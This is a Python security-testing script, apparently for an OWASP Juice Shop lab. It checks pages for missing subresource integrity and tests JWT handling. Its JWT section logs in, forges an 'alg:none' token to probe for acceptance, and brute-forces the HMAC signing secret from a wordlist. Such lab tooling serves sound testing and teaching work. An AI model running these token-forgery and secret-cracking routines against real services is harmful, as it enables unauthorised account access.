# a08_integrity.py
#!/usr/bin/env python3
import base64, hashlib, hmac, json, re, time
from urllib.parse import urljoin, urlparse
import requests

def _b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

def _b64url_decode(seg: str) -> bytes:
    pad = '=' * (-len(seg) % 4)
    return base64.urlsafe_b64decode(seg + pad)

def login_get_jwt(session, base, email, password, timeout=10.0):
    base = base.rstrip("/")
    r = session.post(f"{base}/rest/user/login", json={"email": email, "password": password}, timeout=timeout)
    r.raise_for_status()
    js = r.json()
    token = (js.get("authentication") or {}).get("token") or js.get("token")
    if not token:
        raise RuntimeError(f"No JWT in login response: {js}")
    return token

def whoami(session, base, token, timeout=10.0):
    base = base.rstrip("/")
    headers = {"Authorization": f"Bearer {token}"} if token else {}
    r = session.get(f"{base}/rest/user/whoami", headers=headers, timeout=timeout)
    return r

# ---------- SRI CHECKER ----------
SCRIPT_RE = re.compile(r"<script[^>]+src=['\"]([^'\"]+)['\"][^>]*>", re.IGNORECASE)
LINK_RE   = re.compile(r"<link[^>]+rel=['\"][^'\"]*stylesheet[^'\"]*['\"][^>]*href=['\"]([^'\"]+)['\"][^>]*>", re.IGNORECASE)
INTEGRITY_RE = re.compile(r"integrity=['\"]([^'\"]+)['\"]", re.IGNORECASE)

def fetch_html(session, base, timeout=10.0):
    r = session.get(base, timeout=timeout)
    r.raise_for_status()
    return r.text

def extract_assets(html: str, base_url: str):
    assets = []
    for tag_re, kind in ((SCRIPT_RE, "script"), (LINK_RE, "style")):
        for m in tag_re.finditer(html):
            src = m.group(1)
            full = urljoin(base_url, src)
            tag_html = m.group(0)
            integ = None
            mi = INTEGRITY_RE.search(tag_html)
            if mi:
                integ = mi.group(1).strip()
            assets.append({"kind": kind, "url": full, "integrity": integ})
    return assets

def parse_integrity(integ: str):
    """
    integrity="sha256-<b64> sha384-<b64> ..."
    Return list of (alg, b64).
    """
    out = []
    if not integ:
        return out
    parts = integ.strip().split()
    for p in parts:
        if "-" in p:
            alg, b64v = p.split("-", 1)
            alg = alg.lower()
            if alg in ("sha256","sha384","sha512"):
                out.append((alg, b64v))
    return out

def hash_bytes(alg: str, content: bytes) -> bytes:
    if alg == "sha256":
        return hashlib.sha256(content).digest()
    if alg == "sha384":
        return hashlib.sha384(content).digest()
    if alg == "sha512":
        return hashlib.sha512(content).digest()
    raise ValueError("Unsupported SRI alg: " + alg)

def check_sri_for_asset(session, asset, timeout=10.0):
    """Return finding dict."""
    u = asset["url"]
    o = urlparse(u)
    finding = {"url": u, "kind": asset["kind"], "integrity": asset["integrity"], "issues": []}
    if o.scheme not in ("http", "https"):
        finding["issues"].append("NON_HTTP_RESOURCE")
        return finding
    if o.scheme == "http":
        finding["issues"].append("INSECURE_SCHEME_HTTP")
    # Fetch content
    r = session.get(u, timeout=timeout)
    if not r.ok:
        finding["issues"].append(f"FETCH_FAILED_{r.status_code}")
        return finding
    content = r.content
    host_base = urlparse(asset.get("base_origin","")).netloc if asset.get("base_origin") else None
    external = None
    try:
        external = (o.netloc != host_base) if host_base else None
    except Exception:
        pass

    if external and not asset["integrity"]:
        finding["issues"].append("MISSING_SRI_FOR_CROSS_ORIGIN")

    # If integrity present, verify
    if asset["integrity"]:
        ok_any = False
        mismatches = []
        for alg, b64v in parse_integrity(asset["integrity"]):
            calc = hash_bytes(alg, content)
            if _b64url(calc).replace('_','/').replace('-','+') == b64v or base64.b64encode(calc).decode() == b64v:
                ok_any = True
            else:
                mismatches.append(f"{alg}_MISMATCH")
        if not ok_any:
            if mismatches:
                finding["issues"].extend(mismatches)
            else:
                finding["issues"].append("INTEGRITY_FORMAT_UNKNOWN")
    return finding

def sri_check(session, base_url, timeout=10.0):
    base_url = base_url.rstrip("/")
    html = fetch_html(session, base_url, timeout=timeout)
    assets = extract_assets(html, base_url)
    base_origin = urlparse(base_url).netloc
    for a in assets:
        a["base_origin"] = base_origin
    findings = []
    for a in assets:
        findings.append(check_sri_for_asset(session, a, timeout=timeout))
        time.sleep(0.05)
    return findings

# ---------- JWT INTEGRITY TEST ----------
def jwt_segments(token: str):
    parts = token.split(".")
    if len(parts) != 3:
        raise ValueError("Not a 3-part JWT")
    h_raw = _b64url_decode(parts[0])
    p_raw = _b64url_decode(parts[1])
    sig   = parts[2]
    header = json.loads(h_raw.decode("utf-8", "ignore"))
    payload = json.loads(p_raw.decode("utf-8", "ignore"))
    return header, payload, parts[0], parts[1], sig

def jwt_try_none(session, base, token, timeout=10.0):
    """Craft alg:none token and call whoami. Return (accepted(bool), status, body_sample)."""
    hdr, pl, h_b64, p_b64, _ = jwt_segments(token)
    hdr2 = {"alg":"none","typ":"JWT"}
    h2 = _b64url(json.dumps(hdr2, separators=(",",":")).encode())
    p2 = p_b64  # keep same payload
    none_token = f"{h2}.{p2}."
    r = whoami(session, base, none_token, timeout=timeout)
    ok = r.ok and r.status_code < 400
    sample = (r.text or "")[:300]
    return ok, r.status_code, sample

def jwt_bruteforce_hs(session, token: str, candidates):
    """Try to recover HS* secret by HMAC check."""
    hdr, pl, h_b64, p_b64, sig_hex = jwt_segments(token)
    alg = (hdr.get("alg") or "").upper()
    if not alg.startswith("HS"):
        return None, alg  # not HMAC
    signed = f"{h_b64}.{p_b64}".encode()
    sig = _b64url_decode(sig_hex)
    for secret in candidates:
        dig = None
        if alg == "HS256":
            dig = hmac.new(secret.encode(), signed, hashlib.sha256).digest()
        elif alg == "HS384":
            dig = hmac.new(secret.encode(), signed, hashlib.sha384).digest()
        elif alg == "HS512":
            dig = hmac.new(secret.encode(), signed, hashlib.sha512).digest()
        else:
            break
        if hmac.compare_digest(dig, sig):
            return secret, alg
    return None, alg
if __name__ == "__main__":
    import argparse, json, sys, requests

    def make_session(burp: str | None):
        s = requests.Session()
        if burp:
            s.proxies = {"http": burp, "https": burp}
            s.verify = False
        s.headers.update({"User-Agent": "A08-Integrity/1.0"})
        return s

    ap = argparse.ArgumentParser(prog="a08_integrity.py", description="OWASP A08: SRI + JWT integrity checks (Juice Shop lab)")
    sub = ap.add_subparsers(dest="cmd", required=True)

    p_sri = sub.add_parser("sri", help="Scan the home page for SRI / insecure assets")
    p_sri.add_argument("--base", required=True, help="Base page, e.g. http://127.0.0.1:3000")
    p_sri.add_argument("--burp", help="Proxy, e.g. http://127.0.0.1:8080")
    p_sri.add_argument("--timeout", type=float, default=15.0)
    p_sri.add_argument("--out", help="Write findings JSON to this file")

    p_jwt = sub.add_parser("jwt", help="Login, test alg:none, optionally brute-force HMAC secret")
    p_jwt.add_argument("--base", required=True, help="API root, e.g. http://127.0.0.1:3000")
    p_jwt.add_argument("--email", required=True)
    p_jwt.add_argument("--password", required=True)
    p_jwt.add_argument("--wordlist", help="Path to a text file of candidate secrets (one per line)")
    p_jwt.add_argument("--words", help="Comma-separated secrets (alternative to --wordlist)")
    p_jwt.add_argument("--burp", help="Proxy, e.g. http://127.0.0.1:8080")
    p_jwt.add_argument("--timeout", type=float, default=15.0)

    args = ap.parse_args()
    s = make_session(getattr(args, "burp", None))

    try:
        if args.cmd == "sri":
            findings = sri_check(s, args.base, timeout=args.timeout)
            for f in findings:
                issues = ", ".join(f["issues"]) if f["issues"] else "OK"
                print(f"[{f['kind']}] {f['url']}")
                print(f"    integrity={f['integrity']!r}  issues={issues}")
            if args.out:
                with open(args.out, "w", encoding="utf-8") as fh:
                    json.dump(findings, fh, indent=2)
                print(f"\n[+] Wrote JSON: {args.out}")

        elif args.cmd == "jwt":
            token = login_get_jwt(s, args.base, args.email, args.password, timeout=args.timeout)
            print("[+] Login OK. Got JWT.")
            accepted, code, body = jwt_try_none(s, args.base, token, timeout=args.timeout)
            if accepted:
                print(f"[!] Server ACCEPTED alg:none token (HTTP {code})  <-- A08 fail")
            else:
                print(f"[+] Server rejected alg:none token (HTTP {code})")

            cand = []
            if args.wordlist:
                with open(args.wordlist, "r", encoding="utf-8", errors="ignore") as fh:
                    cand = [w.strip() for w in fh if w.strip()]
            if args.words:
                cand += [w.strip() for w in args.words.split(",") if w.strip()]

            if cand:
                found, alg = jwt_bruteforce_hs(s, token, cand)
                if found:
                    print(f"[!] JWT {alg} secret appears guessable: {found!r}  <-- tokens forgeable")
                else:
                    print(f"[+] Did not recover JWT secret with provided list (alg={alg}).")
            else:
                print("[i] No candidates provided for HMAC brute-force (use --wordlist or --words).")

    except Exception as e:
        print(f"[x] Error: {e}")
        sys.exit(1)
